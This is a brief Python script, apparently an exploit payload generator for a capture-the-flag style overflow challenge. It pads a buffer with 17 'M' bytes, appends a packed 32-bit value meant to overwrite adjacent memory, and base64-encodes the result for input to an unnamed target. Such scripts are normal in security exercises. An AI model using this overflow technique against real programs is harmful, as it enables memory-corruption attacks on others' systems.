
import sys
import struct
import base64

buf = b'MMMMMMMMMMMMMMMMM'
buf += struct.pack('<I', 3644490646)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
